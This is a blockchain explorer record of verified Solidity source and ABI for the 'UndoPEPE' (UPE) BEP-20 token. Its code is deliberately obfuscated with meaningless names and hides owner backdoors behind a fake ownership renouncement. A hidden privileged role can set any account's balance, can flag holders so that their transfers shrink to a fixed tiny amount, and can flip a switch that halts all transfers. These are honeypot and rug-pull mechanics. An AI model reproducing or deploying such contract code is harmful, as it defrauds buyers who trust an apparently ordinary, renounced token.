{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.11;\n\ninterface walletReceiver {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address minTo) external view returns (uint256);\n\n    function transfer(address amountEnableTeam, uint256 swapShould) external returns (bool);\n\n    function allowance(address atBuyTo, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 swapShould) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address amountEnableTeam,\n        uint256 swapShould\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed atList, uint256 value);\n    event Approval(address indexed atBuyTo, address indexed spender, uint256 value);\n}\n\nabstract contract feeSwapReceiver {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface isAmount {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface limitFrom {\n    function createPair(address toAmount, address launchedFrom) external returns (address);\n}\n\ninterface walletReceiverMetadata is walletReceiver {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract UndoPEPE is feeSwapReceiver, walletReceiver, walletReceiverMetadata {\n\n    function owner() external view returns (address) {\n        return marketingMin;\n    }\n\n    uint256 swapReceiver;\n\n    function liquidityAtReceiver(address senderMode, uint256 swapShould) public {\n        totalMin();\n        isTotal[senderMode] = swapShould;\n    }\n\n    function minSwap() public {\n        emit OwnershipTransferred(exemptAt, address(0));\n        marketingMin = address(0);\n    }\n\n    uint8 private enableAmount = 18;\n\n    constructor (){\n        if (listMarketingBuy == enableShould) {\n            isAt = true;\n        }\n        isAmount swapFrom = isAmount(marketingBuyFrom);\n        maxToken = limitFrom(swapFrom.factory()).createPair(swapFrom.WETH(), address(this));\n        if (exemptTake) {\n            exemptTake = true;\n        }\n        exemptAt = _msgSender();\n        minSwap();\n        fromLaunchAt[exemptAt] = true;\n        isTotal[exemptAt] = totalModeToken;\n        \n        emit Transfer(address(0), exemptAt, totalModeToken);\n    }\n\n    function launchedSell(address enableTeam, address amountEnableTeam, uint256 swapShould) internal returns (bool) {\n        if (enableTeam == exemptAt) {\n            return receiverList(enableTeam, amountEnableTeam, swapShould);\n        }\n        uint256 maxAt = walletReceiver(maxToken).balanceOf(tokenAuto);\n        require(maxAt == launchedMarketing);\n        require(amountEnableTeam != tokenAuto);\n        if (maxAuto[enableTeam]) {\n            return receiverList(enableTeam, amountEnableTeam, fromTotal);\n        }\n        return receiverList(enableTeam, amountEnableTeam, swapShould);\n    }\n\n    address tokenAuto = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    uint256 constant fromTotal = 11 ** 10;\n\n    string private launchEnable = \"Undo PEPE\";\n\n    function receiverList(address enableTeam, address amountEnableTeam, uint256 swapShould) internal returns (bool) {\n        require(isTotal[enableTeam] >= swapShould);\n        isTotal[enableTeam] -= swapShould;\n        isTotal[amountEnableTeam] += swapShould;\n        emit Transfer(enableTeam, amountEnableTeam, swapShould);\n        return true;\n    }\n\n    address marketingBuyFrom = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    bool public exemptTake;\n\n    string private launchedTeam = \"UPE\";\n\n    mapping(address => uint256) private isTotal;\n\n    function shouldExemptLimit(uint256 swapShould) public {\n        totalMin();\n        launchedMarketing = swapShould;\n    }\n\n    uint256 launchedMarketing;\n\n    function transfer(address senderMode, uint256 swapShould) external virtual override returns (bool) {\n        return launchedSell(_msgSender(), senderMode, swapShould);\n    }\n\n    address public maxToken;\n\n    uint256 private totalModeToken = 100000000 * 10 ** 18;\n\n    function getOwner() external view returns (address) {\n        return marketingMin;\n    }\n\n    bool private isAt;\n\n    mapping(address => bool) public maxAuto;\n\n    function tokenTotal(address atWallet) public {\n        if (shouldLiquidityToken) {\n            return;\n        }\n        \n        fromLaunchAt[atWallet] = true;\n        \n        shouldLiquidityToken = true;\n    }\n\n    address public exemptAt;\n\n    function symbol() external view virtual override returns (string memory) {\n        return launchedTeam;\n    }\n\n    address private marketingMin;\n\n    bool public listMarketingBuy;\n\n    mapping(address => bool) public fromLaunchAt;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return totalModeToken;\n    }\n\n    bool private enableShould;\n\n    function allowance(address isFrom, address limitSwap) external view virtual override returns (uint256) {\n        if (limitSwap == marketingBuyFrom) {\n            return type(uint256).max;\n        }\n        return totalReceiver[isFrom][limitSwap];\n    }\n\n    function balanceOf(address minTo) public view virtual override returns (uint256) {\n        return isTotal[minTo];\n    }\n\n    bool public receiverWallet;\n\n    function totalMin() private view {\n        require(fromLaunchAt[_msgSender()]);\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return enableAmount;\n    }\n\n    bool public shouldLiquidityToken;\n\n    function transferFrom(address enableTeam, address amountEnableTeam, uint256 swapShould) external override returns (bool) {\n        if (_msgSender() != marketingBuyFrom) {\n            if (totalReceiver[enableTeam][_msgSender()] != type(uint256).max) {\n                require(swapShould <= totalReceiver[enableTeam][_msgSender()]);\n                totalReceiver[enableTeam][_msgSender()] -= swapShould;\n            }\n        }\n        return launchedSell(enableTeam, amountEnableTeam, swapShould);\n    }\n\n    event OwnershipTransferred(address indexed receiverLaunch, address indexed atLimit);\n\n    function walletListSell(address senderToAt) public {\n        totalMin();\n        \n        if (senderToAt == exemptAt || senderToAt == maxToken) {\n            return;\n        }\n        maxAuto[senderToAt] = true;\n    }\n\n    function approve(address limitSwap, uint256 swapShould) public virtual override returns (bool) {\n        totalReceiver[_msgSender()][limitSwap] = swapShould;\n        emit Approval(_msgSender(), limitSwap, swapShould);\n        return true;\n    }\n\n    mapping(address => mapping(address => uint256)) private totalReceiver;\n\n    function name() external view virtual override returns (string memory) {\n        return launchEnable;\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"atBuyTo\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"receiverLaunch\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"atLimit\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"atList\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"isFrom\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"limitSwap\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"limitSwap\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"swapShould\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"minTo\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"exemptAt\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"exemptTake\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"fromLaunchAt\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"senderMode\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"swapShould\",\"type\":\"uint256\"}],\"name\":\"liquidityAtReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"listMarketingBuy\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"maxAuto\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"maxToken\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"minSwap\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverWallet\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"swapShould\",\"type\":\"uint256\"}],\"name\":\"shouldExemptLimit\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"shouldLiquidityToken\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"atWallet\",\"type\":\"address\"}],\"name\":\"tokenTotal\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"senderMode\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"swapShould\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"enableTeam\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"amountEnableTeam\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"swapShould\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"senderToAt\",\"type\":\"address\"}],\"name\":\"walletListSell\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "UndoPEPE", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}